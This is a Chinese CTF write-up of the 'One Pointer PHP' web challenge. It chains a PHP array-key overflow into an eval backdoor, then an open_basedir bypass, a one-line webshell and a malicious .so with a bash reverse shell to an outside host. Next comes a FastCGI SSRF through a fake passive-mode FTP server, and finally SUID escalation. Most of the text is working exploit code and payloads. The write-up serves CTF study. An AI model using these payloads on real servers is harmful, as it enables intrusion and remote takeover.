---
title: '[蓝帽杯 2021]One Pointer PHP'
date: 2024-11-08 19:41:52
tags:
      - 数组key溢出
      - 绕过open_basedir
      - FTP被动模式
      - SSRF攻击FPM
      - SUID提权
categories: 刷题笔记
---

## [蓝帽杯 2021]One Pointer PHP

我们发现源码泄露

user.php

```php
<?php
class User{
	public $count;
}
?>
```

add_api

```php
<?php
include "user.php";
if($user=unserialize($_COOKIE["data"])){
	$count[++$user->count]=1;
	if($count[]=1){
		$user->count+=1;
		setcookie("data",serialize($user));
	}else{
		eval($_GET["backdoor"]);
	}
}else{
	$user=new User;
	$user->count=1;
	setcookie("data",serialize($user));
}
?>
```

我们发现要想执行代码，这就要令`$count[]=1`这段为假
	    但是这个是个赋值语句，无论怎样都为`int(1)`

这里考察到一个点：

## 数组key溢出

原理就是当key等于PHP int类型数据的最大值时，想要再插入一个更大的值便会造成溢出导致出现Warning，关于PHP int类型数据最大值的参考文献如下：

> PHP的int型数据取值范围，与操作系统相关，32位系统上为2的31次方，即-2147483648到2147483647，64位系统上为2的63次方，即-9223372036854775808到9223372036854775807。



所以我们可以令count=**9223372036854775806**

我们直接构造payload

```
<?php
class User{
	public $count=9223372036854775806;
}
$a = new User;
echo urlencode(serialize($a));
//O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D
```

然后将cookie修改为 data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D

传上去后，我们查看phpinfo()

我们在phpinfo()中发现disable_functions和open_basedir：

**open_basedir可将用户访问文件的活动范围限制在指定的区域**

![image-20241108195447798](C:/Users/11/AppData/Roaming/Typora/typora-user-images/image-20241108195447798.png)

## 绕过open_basedir

这里受限于open_basedir的限制只能读取Web服务根目录下的文件，我们需要绕过open_basedir，具体绕过方法我们有以下几种方法：

- 命令执行函数绕过（system等命令执行函数）
- 软链接：symlink()函数
- glob伪协议（搭配PHP原生类DirectoryIterator使用）
- 利用ini_set读取文件内容

引用自[Open_basedir绕过](https://www.cnblogs.com/LLeaves/p/13210005.html)

在这道题中并没有过滤ini_set，因此我们可以构造下面的payload来绕过open_basedir去读取根目录的文件(eval()可以执行多条php语句)

```
mkdir('ye'); 
chdir('ye');
ini_set('open_basedir','..');
chdir('..');
chdir('..');
chdir('..');
chdir('..'); //chdir次数等同于Web目录返回根目录所需次数再加一
ini_set('open_basedir','/');
var_dump(scandir('./'));
```

![image-20241108200108174](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411082001227.png)

或者我们也可以使用PHP原生类DirectoryLterator结合glob协议来列文件

```
$a = new DirectoryIterator("glob:///*");
foreach($a as $f){
    echo($f->__toString().'<br>');
}
```

效果也是一样的。

至此，我们可以构造出读取文件的Payload：

```
mkdir('ye'); 
chdir('ye');
ini_set('open_basedir','..');
chdir('..');
chdir('..');
chdir('..');
chdir('..'); 
ini_set('open_basedir','/');
var_dump(file_get_contents('/usr/local/etc/php/php.ini'));

```

但我们无法读取到根目录下的/flag，不过在php.ini中我们看到了加载了一个so扩展

![image-20241108200915904](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411082009943.png)

**预期题解是Pwn这个so然后来获取flag**，pwn师傅没空

除了这个我们也可以想到绕过disable__function直接rce，我们可以通过挂载而已so的方式来突破disable_function来实现rce，挂载so有两种方法

- dl()函数挂载 (dl被ban)
- 直接写入配置文件的extension中

但是这里好像都不可行，所以只能另寻思路。
		我们还可以在`/usr/local/etc/`目录下看到FPM的文件`php-fpm.conf`

![image-20241108201534921](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411082015023.png)	

因此可以确定这个道题使用php-fpm，也可以通过读取/proc/self/cmdline看到FPM的进程 

![image-20241108202425967](C:/Users/11/AppData/Roaming/Typora/typora-user-images/image-20241108202425967.png)

接下来，我们尝试读取fpm的配置文件：

```bash
mkdir('ye'); 
chdir('ye');
ini_set('open_basedir','..');
chdir('..');
chdir('..');
chdir('..');
chdir('..'); 
ini_set('open_basedir','/');
var_dump(file_get_contents('/usr/local/etc/php-fpm.d/www.conf'));
```

![image-20241108202544538](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411082025579.png)

我们看到FPM运行在9001端口

接下来就是对FPM进行攻击了

## SSRF攻击FPM

我们可以通过ssrf来攻击FPM，但是受限于这道题的disable_functions，我们无法直接SSRF，但是可以利用

`file_put_contents()`的一个特性来实现SSRF：

> `file_put_contents`在使用 ftp 协议时, 会将 data 的内容上传到 ftp 服务器, 由于上面说的`pasv`模式下, 服务器的地址和端口是可控, 我们可以将地址和端口指到`127.0.0.1:9000`.同时由于 ftp 的特性,不会有任何的多余内容, 类似`gopher`协议, 会将`data`原封不动的发给`127.0.0.1:9000`, 完美符合攻击fastcgi(FPM)的要求.

首先编写一个恶意so来执行命令：

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void preload (void){
    system("bash -c 'exec bash -i >&/dev/tcp/IP/PORT <&1'"); //反弹Shell，配置需修改
}


//该文件后缀为c，然后我们需要将其编译为so文件
```

编译文件：

```
gcc 1.c -fPIC -shared -o 1.so
```

然后将so文件上传上去：

```
/add_api.php?backdoor=mkdir('ye'); chdir('ye');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..'); ini_set('open_basedir','/');var_dump(copy('YOUR_URL/1.so','/var/www/html/1.so'));
```

emmmm，这一步不知道咋传的，我们换种方法，我们用file_put_content传一句话木马上去

```
?backdoor=file_put_content("/var/www/html/1.php","<?php eval($_POST[1]);?>");
```

然后我们访问1.php

![image-20241108205812651](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411082058716.png)

应该成功上传了

然后我们用蚁剑进行连接，再将编译好的so文件直接拖上去，简简单单

![image-20241108205928812](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411082059852.png)

接下来就是想办法SSRF打FPM来挂载so文件实现RCE，可以找到一个直接攻击的Payload，修改一下关键配置：

```php
<?php
/**
 * Note : Code is released under the GNU LGPL
 *
 * Please do not change the header of this file
 *
 * This library is free software; you can redistribute it and/or modify it under the terms of the GNU
 * Lesser General Public License as published by the Free Software Foundation; either version 2 of
 * the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 * See the GNU Lesser General Public License for more details.
 */
/**
 * Handles communication with a FastCGI application
 *
 * @author      Pierrick Charron <pierrick@webstart.fr>
 * @version     1.0
 */
class FCGIClient
{
    const VERSION_1            = 1;
    const BEGIN_REQUEST        = 1;
    const ABORT_REQUEST        = 2;
    const END_REQUEST          = 3;
    const PARAMS               = 4;
    const STDIN                = 5;
    const STDOUT               = 6;
    const STDERR               = 7;
    const DATA                 = 8;
    const GET_VALUES           = 9;
    const GET_VALUES_RESULT    = 10;
    const UNKNOWN_TYPE         = 11;
    const MAXTYPE              = self::UNKNOWN_TYPE;
    const RESPONDER            = 1;
    const AUTHORIZER           = 2;
    const FILTER               = 3;
    const REQUEST_COMPLETE     = 0;
    const CANT_MPX_CONN        = 1;
    const OVERLOADED           = 2;
    const UNKNOWN_ROLE         = 3;
    const MAX_CONNS            = 'MAX_CONNS';
    const MAX_REQS             = 'MAX_REQS';
    const MPXS_CONNS           = 'MPXS_CONNS';
    const HEADER_LEN           = 8;
    /**
     * Socket
     * @var Resource
     */
    private $_sock = null;
    /**
     * Host
     * @var String
     */
    private $_host = null;
    /**
     * Port
     * @var Integer
     */
    private $_port = null;
    /**
     * Keep Alive
     * @var Boolean
     */
    private $_keepAlive = false;
    /**
     * Constructor
     *
     * @param String $host Host of the FastCGI application
     * @param Integer $port Port of the FastCGI application
     */
    public function __construct($host, $port = 9001) // and default value for port, just for unixdomain socket
    {
        $this->_host = $host;
        $this->_port = $port;
    }
    /**
     * Define whether or not the FastCGI application should keep the connection
     * alive at the end of a request
     *
     * @param Boolean $b true if the connection should stay alive, false otherwise
     */
    public function setKeepAlive($b)
    {
        $this->_keepAlive = (boolean)$b;
        if (!$this->_keepAlive && $this->_sock) {
            fclose($this->_sock);
        }
    }
    /**
     * Get the keep alive status
     *
     * @return Boolean true if the connection should stay alive, false otherwise
     */
    public function getKeepAlive()
    {
        return $this->_keepAlive;
    }
    /**
     * Create a connection to the FastCGI application
     */
    private function connect()
    {
        if (!$this->_sock) {
            //$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
            $this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
            if (!$this->_sock) {
                throw new Exception('Unable to connect to FastCGI application');
            }
        }
    }
    /**
     * Build a FastCGI packet
     *
     * @param Integer $type Type of the packet
     * @param String $content Content of the packet
     * @param Integer $requestId RequestId
     */
    private function buildPacket($type, $content, $requestId = 1)
    {
        $clen = strlen($content);
        return chr(self::VERSION_1)         /* version */
            . chr($type)                    /* type */
            . chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
            . chr($requestId & 0xFF)        /* requestIdB0 */
            . chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
            . chr($clen & 0xFF)             /* contentLengthB0 */
            . chr(0)                        /* paddingLength */
            . chr(0)                        /* reserved */
            . $content;                     /* content */
    }
    /**
     * Build an FastCGI Name value pair
     *
     * @param String $name Name
     * @param String $value Value
     * @return String FastCGI Name value pair
     */
    private function buildNvpair($name, $value)
    {
        $nlen = strlen($name);
        $vlen = strlen($value);
        if ($nlen < 128) {
            /* nameLengthB0 */
            $nvpair = chr($nlen);
        } else {
            /* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
            $nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
        }
        if ($vlen < 128) {
            /* valueLengthB0 */
            $nvpair .= chr($vlen);
        } else {
            /* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
            $nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
        }
        /* nameData & valueData */
        return $nvpair . $name . $value;
    }
    /**
     * Read a set of FastCGI Name value pairs
     *
     * @param String $data Data containing the set of FastCGI NVPair
     * @return array of NVPair
     */
    private function readNvpair($data, $length = null)
    {
        $array = array();
        if ($length === null) {
            $length = strlen($data);
        }
        $p = 0;
        while ($p != $length) {
            $nlen = ord($data{$p++});
            if ($nlen >= 128) {
                $nlen = ($nlen & 0x7F << 24);
                $nlen |= (ord($data{$p++}) << 16);
                $nlen |= (ord($data{$p++}) << 8);
                $nlen |= (ord($data{$p++}));
            }
            $vlen = ord($data{$p++});
            if ($vlen >= 128) {
                $vlen = ($nlen & 0x7F << 24);
                $vlen |= (ord($data{$p++}) << 16);
                $vlen |= (ord($data{$p++}) << 8);
                $vlen |= (ord($data{$p++}));
            }
            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
            $p += ($nlen + $vlen);
        }
        return $array;
    }
    /**
     * Decode a FastCGI Packet
     *
     * @param String $data String containing all the packet
     * @return array
     */
    private function decodePacketHeader($data)
    {
        $ret = array();
        $ret['version']       = ord($data{0});
        $ret['type']          = ord($data{1});
        $ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
        $ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
        $ret['paddingLength'] = ord($data{6});
        $ret['reserved']      = ord($data{7});
        return $ret;
    }
    /**
     * Read a FastCGI Packet
     *
     * @return array
     */
    private function readPacket()
    {
        if ($packet = fread($this->_sock, self::HEADER_LEN)) {
            $resp = $this->decodePacketHeader($packet);
            $resp['content'] = '';
            if ($resp['contentLength']) {
                $len  = $resp['contentLength'];
                while ($len && $buf=fread($this->_sock, $len)) {
                    $len -= strlen($buf);
                    $resp['content'] .= $buf;
                }
            }
            if ($resp['paddingLength']) {
                $buf=fread($this->_sock, $resp['paddingLength']);
            }
            return $resp;
        } else {
            return false;
        }
    }
    /**
     * Get Informations on the FastCGI application
     *
     * @param array $requestedInfo information to retrieve
     * @return array
     */
    public function getValues(array $requestedInfo)
    {
        $this->connect();
        $request = '';
        foreach ($requestedInfo as $info) {
            $request .= $this->buildNvpair($info, '');
        }
        fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
        $resp = $this->readPacket();
        if ($resp['type'] == self::GET_VALUES_RESULT) {
            return $this->readNvpair($resp['content'], $resp['length']);
        } else {
            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
        }
    }
    /**
     * Execute a request to the FastCGI application
     *
     * @param array $params Array of parameters
     * @param String $stdin Content
     * @return String
     */
    public function request(array $params, $stdin)
    {
        $response = '';
//        $this->connect();
        $request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
        $paramsRequest = '';
        foreach ($params as $key => $value) {
            $paramsRequest .= $this->buildNvpair($key, $value);
        }
        if ($paramsRequest) {
            $request .= $this->buildPacket(self::PARAMS, $paramsRequest);
        }
        $request .= $this->buildPacket(self::PARAMS, '');
        if ($stdin) {
            $request .= $this->buildPacket(self::STDIN, $stdin);
        }
        $request .= $this->buildPacket(self::STDIN, '');
        echo('?file=ftp://ip:9999/&data='.urlencode($request));
//        fwrite($this->_sock, $request);
//        do {
//            $resp = $this->readPacket();
//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
//                $response .= $resp['content'];
//            }
//        } while ($resp && $resp['type'] != self::END_REQUEST);
//        var_dump($resp);
//        if (!is_array($resp)) {
//            throw new Exception('Bad request');
//        }
//        switch (ord($resp['content']{4})) {
//            case self::CANT_MPX_CONN:
//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
//                break;
//            case self::OVERLOADED:
//                throw new Exception('New request rejected; too busy [OVERLOADED]');
//                break;
//            case self::UNKNOWN_ROLE:
//                throw new Exception('Role value not known [UNKNOWN_ROLE]');
//                break;
//            case self::REQUEST_COMPLETE:
//                return $response;
//        }
    }
}
?>
<?php
// real exploit start here
//if (!isset($_REQUEST['cmd'])) {
//    die("Check your input\n");
//}
//if (!isset($_REQUEST['filepath'])) {
//    $filepath = __FILE__;
//}else{
//    $filepath = $_REQUEST['filepath'];
//}

$filepath = "/var/www/html/add_api.php";
$req = '/'.basename($filepath);
$uri = $req .'?'.'command=whoami';
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php system(\$_REQUEST['command']); phpinfo(); ?>"; 
$php_value = "unserialize_callback_func = system\nextension_dir = /var/www/html\nextension = 1.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = ";   //注意修改这里的so文件名称和路径
$params = array(
    'GATEWAY_INTERFACE' => 'FastCGI/1.0',
    'REQUEST_METHOD'    => 'POST',
    'SCRIPT_FILENAME'   => $filepath,
    'SCRIPT_NAME'       => $req,
    'QUERY_STRING'      => 'command=whoami',
    'REQUEST_URI'       => $uri,
    'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
    'PHP_VALUE'         => $php_value,
    'SERVER_SOFTWARE'   => '80sec/wofeiwo',
    'REMOTE_ADDR'       => '127.0.0.1',
    'REMOTE_PORT'       => '9001',    // 注意这里的FPM端口
    'SERVER_ADDR'       => '127.0.0.1',
    'SERVER_PORT'       => '80',
    'SERVER_NAME'       => 'localhost',
    'SERVER_PROTOCOL'   => 'HTTP/1.1',
    'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->request($params, $code)."\n";
?>

```

将上面的exp写入网站根目录(用file_put_contents也可以，方法很多，不列举了)，我们直接写入php文件，然后拖到蚁剑里，在url访问php文件可以得到Payload:

![image-20241108210606815](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411082106910.png)

```
?file=ftp://ip:9999/&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02B%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B6PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+1.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
```

然后往我们自己的服务器上上传应该py文件，用于开启Fake FTP

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 23))
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcome\n')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.\n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.\n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.\n')
#Size /
conn.send(b'550 Could not get the file size.\n')
#EPSV (1)
conn.send(b'150 ok\n')
#PASV
conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n') #STOR / (2)
conn.send(b'150 Permission denied.\n')
#QUIT
conn.send(b'221 Goodbye.\n')
conn.close()

```

或者用php写一个，效果是一样的

```php
<?php
set_time_limit(10);
$socket = stream_socket_server("tcp://127.0.0.1:9001", $errno, $errstr);
if (!$socket) {
    echo "$errstr ($errno)<br />\n";
} else {
    while ($conn = stream_socket_accept($socket)) {
        var_dump("220 welcome\n" );
        fwrite($conn, "220 welcome\n" );
        fwrite($conn, "331 Username ok, send password.\n" );
        fwrite($conn, "230 Login successful.\n" );
        fwrite($conn, "200 Type set to: Binary.\n" );
        fwrite($conn, "213 1237\n" );
        fwrite($conn, "227 Entering passive mode (127,0,0,1,44,188).\n" );
        fwrite($conn, "150 File status okay. About to open data connection.\n" );
        sleep(3);
        fwrite($conn, "226 Transfer complete.\n" );
        fclose($conn);
    }
    fclose($socket);
}

```

然后我们构造如下payload

vps地址和端口(这里的端口为py文件中开启Fake FTP的端口)记得改下

```
/add_api.php?backdoor=$file=$_GET['file'];$data = $_GET['data'];file_put_contents($file,$data);&file=ftp://ip:23/&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02B%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B6PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+1.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00

```



一切准备完成

我们开两个vps会话，一个用来监听端口（这个端口是之前so文件里的端口），一个用来开启Fake FTP，也就是执行py文件

![image-20241108213906106](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411082139212.png)

![image-20241108213928173](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411082139213.png)

然后执行我们的payload

```
/add_api.php?backdoor=$file=$_GET['file'];$data = $_GET['data'];file_put_contents($file,$data);&file=ftp://60.204.158.87:23/&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02B%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B6PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+1.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
```

我们就成功监听到22222端口了

![image-20241108214437435](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411082144486.png)

## SUID提权

在RCE了之后我们发现无法直接读取/flag文件，这里还有一个SUID提权的小点：

![image-20241108214530094](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411082145137.png)

首先寻找有权限命令的SUID文件：

```python
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```

以上任意一条均可

我们可以看到php命令具有权限

![image-20241108214740362](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411082147449.png)

但是还是需要绕过一下open_basedir,依次执行

```
php -a
mkdir('123'); chdir('123');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..'); ini_set('open_basedir','/');echo(file_get_contents('/flag'));

```

执行该命令的时候要位于`/var/www/html`目录下执行

就可以获得flag：

![image-20241108214857445](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411082148487.png)

参考

https://www.cnblogs.com/yesec/p/15211484.html

https://odiws.github.io/2024/11/07/%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/

https://blog.diggid.fun/2021/05/04/%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP-%E5%A4%8D%E7%8E%B0/#%E5%89%8D%E8%A8%80

https://blog.csdn.net/baidu_39504221/article/details/116720875
